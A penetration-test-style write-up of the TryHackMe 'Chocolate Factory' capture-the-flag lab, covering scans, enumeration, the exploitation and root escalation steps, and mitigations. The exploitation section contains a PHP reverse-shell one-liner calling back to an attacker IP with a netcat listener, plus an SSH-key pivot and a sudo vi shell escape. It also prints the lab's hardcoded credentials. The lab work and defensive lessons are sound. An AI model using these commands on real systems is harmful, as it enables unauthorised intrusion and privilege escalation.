# Penetration-Test-Report


[Chocolate Factory](https://tryhackme.com/room/chocolatefactory)

**Date:** [10/06/2025]  
 **Difficulty:** [Easy]  
**Objective:** [A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!]

---

## Table of Contents

- [1. Summary](#1-summary)
- [2. Methodology](#2-methodology)
- [3. Reconnaissance](#3-reconnaissance)
- [4. Enumeration](#4-enumeration)
- [5. Exploitation](#5-exploitation)
- [6. Privilege Escalation](#6-privilege-escalation)
- [7. Post Exploitation](#7-post-exploitation)
- [8. Flags / Proof](#8-flags--proof)
- [9. Mitigations](#9-mitigations)
- [10. Notes](#10-notes)

---

## 1. Summary

**IP/URL:** [10.10.217.234]  
**Service/Ports:** [21/ftp, 22/SSH, 80/HTTP]  
**Entry Point:** [Reverse shell]  
**Privilege Escalation:** [Sudo -l (vim)]  
**Outcome:** [Root shell obtained, flags captured]  

---

## 2. Methodology

Following the PTES (Penetration Testing Execution Standard):
1. Reconnaissance  
2. Scanning & Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance

## Active

nmap -sV -Pn 10.10.217.234
```
tarting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 11:42 EDT
Nmap scan report for 10.10.217.234
Host is up (0.058s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
``` 
----

## 4. Enumeration
  Web:gobuster    
  
Findings:
  ```
    Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 1466]
/home.php             (Status: 200) [Size: 569]
/validate.php         (Status: 200) [Size: 93]
```
http://10.10.217.234/home.php
The webpage provided a command line to execute.

```
ls -la

total 1152 drwxr-xr-x 2 root root 4096 Oct 6 2020 . drwxr-xr-x 3 root root 4096 Sep 29 2020 .. -rw------- 1 root root 12288 Oct 1 2020 .swp -rw-rw-r-- 1 charlie charley 65719 Sep 30 2020 home.jpg -rw-rw-r-- 1 charlie charley 695 Sep 30 2020 home.php -rw-rw-r-- 1 charlie charley 1060347 Sep 30 2020 image.png -rw-rw-r-- 1 charlie charley 1466 Oct 1 2020 index.html -rw-rw-r-- 1 charlie charley 273 Sep 29 2020 index.php.bak -rw-r--r-- 1 charlie charley 8496 Sep 30 2020 key_rev_key -rw-rw-r-- 1 charlie charley 303 Sep 30 2020 validate.php 
```

Website found: http://10.10.217.234/key_rev_key

Then:
```
strings key_rev_key
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-S************
```

----

## 5. Exploitation

   The webpage provided a command line to execute.
    
  Attack machine:
    ```
    nc -lvnp 4444
    ```

  On the webpage command line:

    ```
    php -r '$sock=fsockopen("10.21.15*.***",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```


   Gained Access As: www-data

   TTY spawn in shell
   ```
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

   Findings:
   ```
   www-data@chocolate-factory:/home/charlie$ ls
   ls
   teleport  teleport.pub  user.txt
   ```

   SSH login as Charlie:
   ```
   ssh -i teleport charlie@10.10.217.234
   ```


----

## 6. Privilege Escalation

   Method: Sudo -l

  Tool Used: vim
```
charlie@chocolate-factory:/$ sudo -l
sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```
Then:
```
charlie@chocolate-factory:/$ sudo /usr/bin/vi -c ':set shell=/bin/bash | shell'
```

Escalated To: root

----

## 7. Post Exploitation

  On /root there's a file: root.py
  ```
    root@chocolate-factory:/root# cat root.py
cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
```

With the key found on strings:
```
root@chocolate-factory:/root# python root.py
python root.py
Enter the key:  {REDACTED}
flag{REDACTED}
```
On /var/www/html# there is a file validate.php
```
root@chocolate-factory:/var/www/html# cat validate.php
cat validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="cn7824"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
```

----

## 8. Flags / Proof

  User Flag: flag{cd5509042371b34e482***********}

  Root Flag: flag{cec59161d338f*********}

  Other Credentials / Loot:

  Key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuS***********

----

## 9. Mitigations

| Vulnerability              | Risk   | Suggested Mitigation                   |
|---------------------------|--------|----------------------------------------|
| Command injection via PHP page | High   | Sanitize user input on home.php or use prepared statements/escaping in shell     |
| Exposed private SSH key     | High   | 	Never store private keys in web-accessible directories          |
| Sudo misconfiguration (vi)    | Medium | Avoid assigning sudo access to editors; use granular access controls     |

----

## 10. Notes

  Time spent: [e.g., 2 hours]

  Tools used: nmap, gobuster, ftp, vi, nc

  Lessons learned: Never trust user input — The ability to execute shell commands via a PHP form is a critical security flaw. Avoid storing sensitive files (keys, credentials) in web-accessible paths. Private keys should never be exposed; this opens the door to easy lateral movement. Granting editor tools like vi in sudo can lead directly to root compromise. 
